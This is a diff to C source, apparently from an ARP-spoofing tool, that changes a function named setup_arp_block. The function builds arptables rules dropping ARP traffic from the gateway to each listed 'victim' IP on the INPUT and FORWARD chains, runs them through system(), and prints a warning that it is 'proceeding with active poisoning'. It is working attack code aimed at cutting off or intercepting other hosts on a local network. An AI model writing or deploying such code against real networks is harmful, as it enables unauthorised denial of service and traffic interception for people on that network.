@@ -17,12 +17,19 @@ int setup_arp_block(unsigned char *gateway_mac, struct Victim *victims, int vict
         char victim_ip[INET_ADDRSTRLEN];
         inet_ntop(AF_INET, victims[i].ip, victim_ip, INET_ADDRSTRLEN);
 
-        char cmd[256];
-        // Rule 1: Drop ARP packets from Gateway to Victim (Input chain)
-        snprintf(cmd, sizeof(cmd), "arptables -A INPUT --source-mac %s --target-ip %s -j DROP 2>/dev/null || "
-                                  "/sbin/arptables -A INPUT --source-mac %s --target-ip %s -j DROP 2>/dev/null || "
-                                  "/usr/sbin/arptables -A INPUT --source-mac %s --target-ip %s -j DROP 2>/dev/null",
-                 gw_mac_str, victim_ip, gw_mac_str, victim_ip, gw_mac_str, victim_ip);
+        char cmd[1024];
+        // Rule 1: Drop ARP packets from Gateway to Victim (Input and Forward chains)
+        // We use --source-mac for the router and --destination-ip for the victim.
+        snprintf(cmd, sizeof(cmd), 
+                 "{ arptables -A INPUT --source-mac %s --destination-ip %s -j DROP 2>/dev/null && "
+                 "  arptables -A FORWARD --source-mac %s --destination-ip %s -j DROP 2>/dev/null; } || "
+                 "{ /sbin/arptables -A INPUT --source-mac %s --destination-ip %s -j DROP 2>/dev/null && "
+                 "  /sbin/arptables -A FORWARD --source-mac %s --destination-ip %s -j DROP 2>/dev/null; } || "
+                 "{ /usr/sbin/arptables -A INPUT --source-mac %s --destination-ip %s -j DROP 2>/dev/null && "
+                 "  /usr/sbin/arptables -A FORWARD --source-mac %s --destination-ip %s -j DROP 2>/dev/null; }",
+                 gw_mac_str, victim_ip, gw_mac_str, victim_ip,
+                 gw_mac_str, victim_ip, gw_mac_str, victim_ip,
+                 gw_mac_str, victim_ip, gw_mac_str, victim_ip);
         
         if (system(cmd) != 0) {
             fprintf(stderr, "[!] Warning: Failed to apply arptables rule for victim %s. Proceeding with active poisoning only.\n", victim_ip);
